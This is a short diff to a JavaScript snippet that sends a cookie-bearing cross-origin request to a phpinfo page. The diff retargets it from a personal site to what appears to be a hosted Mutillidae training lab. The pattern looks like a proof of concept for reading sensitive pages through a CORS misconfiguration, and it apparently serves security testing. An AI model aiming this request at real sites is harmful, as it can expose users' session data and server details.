@@ -1,6 +1,6 @@
 var req = new XMLHttpRequest();
 req.onload = reqListener;
-var url = 'http://christian.marcq.free.fr/php/phpinfo.php';
+var url = 'https://webinsegura.radwarelatam.com/mutillidae/index.php?popUpNotificationCode=SL1&page=phpinfo.php';
 req.withCredentials = true; // send cookie header
 req.open('GET', url, false);
 req.send();
